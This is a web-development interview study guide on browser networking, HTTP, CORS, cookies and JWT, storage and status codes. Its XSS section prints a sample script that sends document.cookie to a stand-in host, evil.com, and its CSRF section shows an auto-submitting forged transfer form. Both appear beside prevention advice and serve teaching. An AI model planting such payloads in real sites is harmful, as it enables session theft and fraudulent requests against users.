# 🌐 Browser & Networking Interview Questions & Answers

---

## 1. What happens when you type a URL and press Enter?

```
1. 🔍 DNS Lookup
   browser cache → OS cache → Router cache → ISP DNS server → Root server
   Result: example.com → 93.184.216.34 (IP address)

2. 🤝 TCP Connection (3-way handshake)
   Client: SYN →
   Server: ← SYN-ACK
   Client: ACK →

3. 🔒 TLS Handshake (for HTTPS)
   Exchange certificates, agree on encryption method
   Establishes encrypted channel

4. 📤 HTTP Request
   GET / HTTP/1.1
   Host: example.com
   Accept: text/html

5. 📥 HTTP Response
   200 OK
   Content-Type: text/html
   [HTML content]

6. 🏗️ Browser Rendering
   Parse HTML → DOM
   Parse CSS → CSSOM
   DOM + CSSOM → Render Tree
   Layout → Paint → Composite
```

---

## 2. HTTP vs HTTPS vs HTTP/2 vs HTTP/3

| Feature | HTTP/1.1 | HTTP/2 | HTTP/3 |
|---------|----------|--------|--------|
| Encryption | Optional | Required in practice | Required |
| Requests per connection | 1 at a time | Multiple (multiplexing) | Multiple |
| Header compression | ❌ | ✅ (HPACK) | ✅ (QPACK) |
| Transport protocol | TCP | TCP | UDP (QUIC) |
| Performance | Baseline | Much better | Best (especially on mobile) |

**HTTP/2 key features:**
- **Multiplexing** → many requests over one connection simultaneously
- **Server push** → server sends resources before browser asks
- **Header compression** → smaller headers = faster

---

## 3. CORS — Cross-Origin Resource Sharing

**🧠 Simple Explanation:** Browser security that blocks JS from requesting resources from a different domain unless the server explicitly allows it.

```
Same origin: https://example.com/api  fetching https://example.com/data ✅
Cross origin: https://myapp.com      fetching https://api.example.com  → CORS check!
```

```javascript
// Server must send these headers to allow cross-origin requests
Access-Control-Allow-Origin: https://myapp.com  // or * for all
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization

// "Preflight" request — browser sends OPTIONS request first for non-simple requests
OPTIONS /api/data HTTP/1.1
Origin: https://myapp.com
Access-Control-Request-Method: POST
```

```javascript
// Common CORS error in console:
// "Access to fetch at 'https://api.com' from origin 'https://app.com' 
//  has been blocked by CORS policy"

// Fix options:
// 1. Add CORS headers on the server (correct solution)
// 2. Use a proxy server
// 3. Use JSONP (old, hacky)
```

---

## 4. Cookies, Sessions, and JWT

```javascript
// Cookie — stored in browser, sent with every request automatically
document.cookie = "user=Alice; Secure; HttpOnly; SameSite=Strict";

// HttpOnly → can't be accessed by JS (prevents XSS stealing cookies)
// Secure → only sent over HTTPS
// SameSite=Strict → only sent for same-origin requests (prevents CSRF)

// Session-based auth flow:
// 1. User logs in
// 2. Server creates session in DB, gives you session ID
// 3. Session ID stored in cookie
// 4. Every request sends cookie → server looks up session in DB

// JWT (JSON Web Token) flow:
// 1. User logs in
// 2. Server creates JWT: header.payload.signature
// 3. Client stores JWT (localStorage or cookie)
// 4. Client sends JWT in Authorization header
// 5. Server verifies signature — no DB lookup needed!

const jwt = "eyJhbGc.eyJ1c2VySWQ.xyz"; // header.payload.signature

// JWT payload example (decode base64 to see):
{
  "userId": 42,
  "role": "admin",
  "exp": 1735689600  // expiry timestamp
}
```

| | Session | JWT |
|--|---------|-----|
| State stored | Server (DB) | Client (token) |
| Scalability | Harder (sticky sessions) | Easier (stateless) |
| Revocation | Instant | Hard (until expiry) |
| Size | Small (just ID) | Larger (all data in token) |

---

## 5. Security: XSS and CSRF

### XSS (Cross-Site Scripting)
**🧠 Simple Explanation:** Attacker injects malicious script into your webpage.

```javascript
// Attacker submits this as a comment:
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>

// If you render it without sanitizing:
<p>Comment: <script>...</script></p>  // ← runs the script!

// Prevention:
// 1. Never use innerHTML with user data
element.innerHTML = userInput;     // ❌ dangerous
element.textContent = userInput;   // ✅ safe (treats as text, not HTML)

// 2. Use Content Security Policy header
// Content-Security-Policy: script-src 'self'  (only run scripts from your domain)

// 3. Sanitize HTML (if you must render HTML)
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
```

### CSRF (Cross-Site Request Forgery)
**🧠 Simple Explanation:** Tricks a logged-in user into making requests they didn't intend.

```html
<!-- User is logged into bank.com -->
<!-- Attacker's evil site has: -->
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker_account">
  <input name="amount" value="10000">
</form>
<script>document.forms[0].submit();</script>
<!-- Browser sends bank.com cookie automatically! -->

<!-- Prevention: -->
<!-- 1. CSRF tokens — hidden unique token in every form -->
<input type="hidden" name="csrf_token" value="abc123unique">

<!-- 2. SameSite cookie attribute -->
<!-- Cookie: session=xyz; SameSite=Strict -->

<!-- 3. Check Origin/Referer headers on server -->
```

---

## 6. WebSockets vs HTTP

```javascript
// HTTP — one request, one response (client always initiates)
fetch('/api/messages').then(r => r.json());

// Polling (workaround for real-time) — wasteful!
setInterval(() => fetch('/api/messages'), 1000);

// WebSocket — persistent bidirectional connection
const ws = new WebSocket('wss://api.example.com/chat');

ws.onopen = () => {
  ws.send(JSON.stringify({ type: 'join', room: 'general' }));
};

ws.onmessage = (event) => {
  const msg = JSON.parse(event.data);
  displayMessage(msg);
};

ws.onerror = (err) => console.error(err);
ws.onclose = () => reconnect();

// Server can push messages without client asking!
// Perfect for: chat, live notifications, collaborative editing, stock prices
```

---

## 7. Local Storage vs Cookies vs IndexedDB

| | localStorage | sessionStorage | Cookies | IndexedDB |
|--|-------------|----------------|---------|-----------|
| Storage | ~5MB | ~5MB | ~4KB | Hundreds of MB |
| Persists | Forever | Tab closes | Custom | Forever |
| Sent to server | ❌ | ❌ | ✅ Auto | ❌ |
| Accessible in | JS | JS | JS + Server | JS |
| Structured data | ❌ (stringify) | ❌ | ❌ | ✅ |

```javascript
// IndexedDB — for large/complex client-side storage
const request = indexedDB.open('MyDB', 1);

request.onupgradeneeded = (e) => {
  const db = e.target.result;
  db.createObjectStore('users', { keyPath: 'id' });
};

request.onsuccess = (e) => {
  const db = e.target.result;
  const tx = db.transaction('users', 'readwrite');
  tx.objectStore('users').add({ id: 1, name: 'Alice' });
};
```

---

## 8. DNS and CDN

```
DNS (Domain Name System):
  "What IP is google.com?"
  browser → OS → ISP → Root DNS → .com DNS → Google's DNS
  Answer: 142.250.80.46
  Cached at each level for TTL duration

CDN (Content Delivery Network):
  Instead of: All users hit your ONE server in US
  With CDN: User in India hits CDN server in Mumbai (much closer!)

  What to serve via CDN:
  ✅ Static files: images, CSS, JS, fonts
  ✅ Video streams
  ❌ Dynamic API responses (use caching headers)
  ❌ Auth-required content
```

---

## Quick Fire Questions

**Q: What is a 301 vs 302 redirect?**
- **301** → Permanent redirect. Search engines transfer link equity.
- **302** → Temporary redirect. Search engines keep original URL indexed.

**Q: What HTTP status codes should you know?**
```
200 OK                  — success
201 Created             — new resource created (POST)
204 No Content          — success, nothing to return (DELETE)
301 Moved Permanently   — permanent redirect
304 Not Modified        — use cached version
400 Bad Request         — client sent invalid data
401 Unauthorized        — not logged in
403 Forbidden           — logged in but no permission
404 Not Found           — resource doesn't exist
409 Conflict            — duplicate resource
422 Unprocessable Entity— validation error
429 Too Many Requests   — rate limited
500 Internal Server Error— server bug
502 Bad Gateway         — proxy/load balancer error
503 Service Unavailable — server overloaded/down
```

**Q: What is a Service Worker?**
A: A JavaScript file that runs in the background (separate thread), intercepts network requests, and enables offline functionality, push notifications, and background sync. The backbone of Progressive Web Apps (PWAs).
